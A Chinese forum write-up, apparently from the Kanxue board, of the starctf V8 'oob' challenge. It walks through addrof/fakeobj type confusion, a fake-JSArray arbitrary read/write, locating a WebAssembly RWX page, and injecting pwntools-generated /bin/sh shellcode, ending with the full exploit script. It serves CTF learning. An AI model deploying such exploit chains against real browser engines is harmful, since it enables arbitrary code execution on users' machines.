ftoi 通过 f64 传入 val 并用 u32 读取相加成 BigInt(高位值左移 32 位与低位值相加)

itof 用 u32 拆开 val，& 0xffffffffn 表示位与，低 32 位保留，高位清 0；高位右移

```
val            = HHHHHHHH LLLLLLLL
val & 0xffffffffn → 00000000 LLLLLLLL   ← 低 32 位
val >> 32n        → 00000000 HHHHHHHH   ← 高 32 位搬到低位
//大概长这样，高低位分别运算并存储
```

_00000000 LLLLLLLL_

_00000000 HHHHHHHH_

注意这是显示形式，u32 储存的是 32 位数据（JS 中普通数字都是 `Number`，>> 这类位运算会先把 number **转换成 32 位整数**再进行操作 ），两个加起来正好是 64 位

addrof() 把 obj 数组的 map 改成浮点数的 map,fakeobj() 相反

```
var obj = {"A": 1};
var obj_arr = [obj];
var float_arr = [1.1,1.2,1.3,1.4];

var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

function addrof(in_obj){
  obj_arr[0] = in_obj;
  obj_arr.oob(float_arr_map);
  let addr = obj_arr[0];
  obj_arr.oob(obj_arr_map);
  return ftoi(addr);
}
function fakeobj(addr){
  float_arr[0] = itof(addr);
  float_arr.oob(obj_arr_map);
  let fake = float_arr[0];
  float_arr.oob(float_arr_map);
  return fake;
}
```

这里得注意到 obj_arr.oob() 读出的正好是该 buffer 的下一个 8 字节，也就是该数组对象自己的 map*

![](https://bbs.kanxue.com/upload/attach/202609/1075564_GMAGYYAAZD7DAGQ.webp)

![](https://bbs.kanxue.com/upload/attach/202609/1075564_NSZH3RYRG2FZ36S.webp)  
发现 array buf 后就是其 JS 对象的 map 指针

```
var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();
```

对应其数组指针

addof() 传入一个 JS 对象 return 对象地址

fakeobj() 传入一个地址，然后让 v8 认为这是一个 JS 对象

都是通过改 map 的方式实现类型混淆

最后得把 map 改回来避免后续操作把数组搞坏

这里的 n 是 JS BigInt 字面量标记

```
var arb_rw_arr = [float_arr_map,1.2,1.3,1.4];
//这里的float_arr_map是double值
function arb_read(addr){
  if (addr%2n == 0) addr += 1n;
  let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
  arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
  return ftoi(fake[0]);
}
function initial_arb_write(addr,val){
  let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
  arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
  fake[0] = itof(BigInt(val));
}
```

伪造一个 JSArray，然后不断修改这个假数组的 `elements` 指针，让 `fake[0]` 实际去读 / 写任意地址

arb_read() 中

```
if (addr%2n == 0) addr += 1n;
```

用于伪造 tagged pointer，欺骗 v8 把他当成 JS 对象

```
let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
```

在 arb_rw_arr 数组对象指针指向的 addr-0x20 处，也就是它的 buffer 构造一个伪 JS 对象

```
arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
```

把假数组的 `elements` 指针控制成：

```
addr - 0x10
```

JSArray 的布局大致如此

```
JSArray
┌─────────────────────┐
│ map                 │  告诉是什么类型
├─────────────────────┤
│ properties          │
├─────────────────────┤
│ elements            │ ────────> 真正存数组元素的地方
├─────────────────────┤
│ length              │
└─────────────────────┘
```

JSArray 本身只有 4 个字段（0x20 字节），元素放在堆上另一块连续内存里（这种设计便于共享内存以及 copy on write）

即 elements 指向某块内存，fake[0] 是去 elements 指向的 + 0x10 处读取第 0 个元素

arb_rw_arr 的内存布局变化

```
真实 arb_rw_arr 的 FixedDoubleArray
┌──────────────────────────────┐
│ E+0x00: FixedDoubleArray.map  │
│ E+0x08: length                │
│ E+0x10: elements[0]           │ = float_arr_map  ──> 被当成 fake.map
│ E+0x18: elements[1]           │ = 1.2            ──> 被当成 fake.properties
│ E+0x20: elements[2]           │ = 1.3            ──> 被当成 fake.elements
│ E+0x28: elements[3]           │ = 1.4            ──> 被当成 fake.length
└──────────────────────────────┘
          ↑
          │ fake = fakeobj(A - 0x20) = fakeobj(E + 0x10)
          │

改 arb_rw_arr[2]：
E+0x20 = addr - 0x10
        ↓
fake.elements = addr - 0x10
        ↓
fake[0] 实际访问：
fake.elements + 0x10 = addr
        ↓
读/写 addr
```

这里有一点注意下，`elements` 指向的通常不是第一个实际数据，而是一个 `FixedArray/FixedDoubleArray` 结构，当前版本下的 offset 为 0x10

内存布局长这样

```
E+0x00  ┃ FixedDoubleArray 的 map        ┃ ┐
E+0x08  ┃ length = 4                      ┃ ┘ buffer 头，共 0x10
E+0x10  ┃ element[0] = float_arr_map     ┃ ← fake 必须从这一行开始
E+0x18  ┃ element[1] = 1.2               ┃
E+0x20  ┃ element[2] = 1.3               ┃  数据区，4 × 8 = 0x20
E+0x28  ┃ element[3] = 1.4               ┃
E+0x30  ┃ ───────── buffer 结束 ─────────┃
A+0x00  ┃ JSArray.map                     ┃ ← A = E + 0x30
A+0x08  ┃ properties                      ┃
A+0x10  ┃ elements → E                    ┃
A+0x18  ┃ length = 4                      ┃
```

等于是`<font>arb_rw_arr</font>` 的元素区被借出来塞进 fake 对象

用 wasm 申请一个 RWX 页

这里可以用用 wat2wasm、wasm2wat

```
var wasm_code = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
  130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
  128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
  128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0,
  10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
```

这里复用一下之前的 wasm，含义大致是导出一块 Wasm Linear Memory

main（）函数 return 42

```
var wasm_code = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
  130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
  128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
  128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0,
  10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);
```

编译 mod, 实例化，导出 main 函数，read rwx_page_addr

这里的 0x88 得 gdb 看一下

![](https://bbs.kanxue.com/upload/attach/202609/1075564_CVCP68MBXUBRA7W.webp)  
wasm_instance = 0x2421fb1a0d31

![](https://bbs.kanxue.com/upload/attach/202609/1075564_X969VFQ9WARPTP9.webp)

![](https://bbs.kanxue.com/upload/attach/202609/1075564_YUS8YU3NG3KVCDP.webp)

![](https://bbs.kanxue.com/upload/attach/202609/1075564_ZS42TE9FFPYMYMP.webp)  
gdb 就是好用啊

#### copy_shellcode

```
function copy_shellcode(addr,shellcode){
  let abuf = new ArrayBuffer(0x100);
  let dataview = new DataView(abuf);
  let backing_store_addr = addrof(abuf) + 0x20n;
  initial_arb_write(backing_store_addr,addr);

  for(let i = 0;i < shellcode.length;i++){
    dataview.setUint32(4*i,shellcode[i],true);
  }
}
```

0x20 是 backing store 的 offset

dataview.setUint32(4*i,shellcode[i],true);，32 位小端序写入

这里用 pwntools 生成一下 shellcode

```
from pwn import *
context.clear(arch='amd64')
context.log_level = 'error'

sc = asm("""
    lea  rdi, [rip + sh]
    xor  esi, esi
    xor  edx, edx
    mov  eax, 59
    syscall
sh:
    .asciz "/bin/sh"
""")

sc = sc.ljust((len(sc) + 3) // 4 * 4, b'\x90')

print("// %d bytes" % len(sc))
print("var shellcode = [")
words = ["0x" + sc[i:i+4][::-1].hex() for i in range(0, len(sc), 4)]
for i in range(0, len(words), 6):
    print("    " + ", ".join(words[i:i+6]) + ",")
print("];")
print(disasm(sc))
```

![](https://bbs.kanxue.com/upload/attach/202609/1075564_T25KKB6CKFZRA4D.webp)

```
var shellcode = [
    0x0b3d8d48, 0x31000000, 0xb8d231f6, 0x0000003b, 0x622f050f, 0x732f6e69,
    0x90900068,
];
```

```
var buf = new ArrayBuffer(8)
var f64_buf = new Float64Array(buf)
var u32_buf = new Uint32Array(buf)

function ftoi(val){   // float to BigInt
  f64_buf[0] = val;
  return BigInt(u32_buf[0]) + (BigInt(u32_buf[1]) << 32n);
}
function itof(val){   // BigInt to float
  u32_buf[0] = Number(val & 0xffffffffn);
  u32_buf[1] = Number(val >> 32n);
  return f64_buf[0];
}

var obj = {"A": 1};
var obj_arr = [obj];
var float_arr = [1.1,1.2,1.3,1.4];

var obj_arr_map = obj_arr.oob();
var float_arr_map = float_arr.oob();

function addrof(in_obj){
  obj_arr[0] = in_obj;
  obj_arr.oob(float_arr_map);
  let addr = obj_arr[0];
  obj_arr.oob(obj_arr_map);
  return ftoi(addr);
}
function fakeobj(addr){
  float_arr[0] = itof(addr);
  float_arr.oob(obj_arr_map);
  let fake = float_arr[0];
  float_arr.oob(float_arr_map);
  return fake;
}

var arb_rw_arr = [float_arr_map,1.2,1.3,1.4];
//这里的float_arr_map是double值
function arb_read(addr){
  if (addr%2n == 0) addr += 1n;
  let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
  arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
  return ftoi(fake[0]);
}
function initial_arb_write(addr,val){
  let fake = fakeobj(addrof(arb_rw_arr) - 0x20n);
  arb_rw_arr[2] = itof(BigInt(addr) - 0x10n);
  fake[0] = itof(BigInt(val));
}

var wasm_code = new Uint8Array([
  0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
  130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
  128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
  128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0, 0,
  10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var f = wasm_instance.exports.main;
var rwx_page_addr = arb_read(addrof(wasm_instance)-1n+0x88n);

function copy_shellcode(addr,shellcode){
  let abuf = new ArrayBuffer(0x100);
  let dataview = new DataView(abuf);
  let backing_store_addr = addrof(abuf) + 0x20n;
  initial_arb_write(backing_store_addr,addr);

  for(let i = 0;i < shellcode.length;i++){
    dataview.setUint32(4*i,shellcode[i],true);
  }
}
var shellcode = [
    0x0b3d8d48, 0x31000000, 0xb8d231f6, 0x0000003b, 0x622f050f, 0x732f6e69,
    0x90900068,
];

copy_shellcode(rwx_page_addr, shellcode);
f();
```

![](https://bbs.kanxue.com/upload/attach/202609/1075564_RJB2H83DTP72EA8.webp)  
终于出了

*   从 0 开始学 V8 漏洞利用之环境搭建（一）  
    [https://cloud.tencent.com/developer/article/1945764](https://cloud.tencent.com/developer/article/1945764)
    
*   从 0 开始学 V8 漏洞利用之 V8 通用利用链（二）  
    [https://cloud.tencent.com/developer/article/1945766](https://cloud.tencent.com/developer/article/1945766)
    
*   从 0 开始学 V8 漏洞利用之 V8 通用利用链（三）  
    [https://cloud.tencent.com/developer/article/1945767](https://cloud.tencent.com/developer/article/1945767)
    
*   Seebug 漏洞平台  
    [https://cloud.tencent.com/developer/column/2195](https://cloud.tencent.com/developer/column/2195)
    
*   [https://www.freebuf.com/vuls/203721.html](https://www.freebuf.com/vuls/203721.html)
    
*   这个讲 starctf oob 质量也挺好  
    [https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/](https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/)
    
*   V8 入门，好文章  
    [https://tokameine.gitbook.io/chose-me-or-javascript-v8](https://tokameine.gitbook.io/chose-me-or-javascript-v8)
    

![](https://bbs.kanxue.com/upload/attach/202609/1075564_TESFVG5YQBZX6UN.webp)

[冰与火的战歌：Windows 内核攻防实战高级班！从零到实战，融合 AI 与 Windows 内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)

最后于 15 小时前 被 shark_pro 编辑 ，原因：